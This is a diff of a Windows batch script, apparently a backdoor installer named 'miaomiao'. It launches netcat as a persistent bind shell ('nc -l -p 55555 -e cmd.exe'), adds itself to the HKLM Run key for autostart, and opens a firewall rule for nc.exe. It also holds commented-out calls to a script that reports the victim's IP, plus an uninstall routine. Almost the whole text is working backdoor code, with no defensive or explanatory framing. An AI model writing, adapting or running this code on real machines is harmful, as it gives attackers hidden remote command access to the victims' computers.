@@ -13,23 +13,24 @@ cls
 
 ::main
 
-call "InviaIP.bat"
+::call "lib\SendIP.bat"
 start nc -l -p 55555 -e cmd.exe -L -d
 exit
 ::---------------------------------------
-:intall
+:install
 
-taskkill.exe /f /im nc.exe
+tools\taskkill.exe /f /im nc.exe
 reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /d "%ProgramFiles%\miaomiao\miaomiao.bat"
-netsh firewall add allowedprogram program = "%BAT_HOME%nc.exe" name = NetCat mode =ENABLE
-call "InviaIP.bat"
+netsh advfirewall firewall add rule name="NetCat" dir=in action=allow program="%BAT_HOME%nc.exe" enable=yes profile=any
+::netsh firewall add allowedprogram program = "%BAT_HOME%nc.exe" name = NetCat mode =ENABLE :: Windows XP
+::call "lib\SendIP.bat"
 start nc -l -p 55555 -e cmd.exe -L -d
 exit
 ::---------------------------------------
 :unistall
 
-taskkill.exe /f /im nc.exe
+tools\taskkill.exe /f /im nc.exe
 reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
 netsh firewall delete allowedprogram NetCat
 del /s /f /q "%ProgramFiles%\miaomiao\*.*"
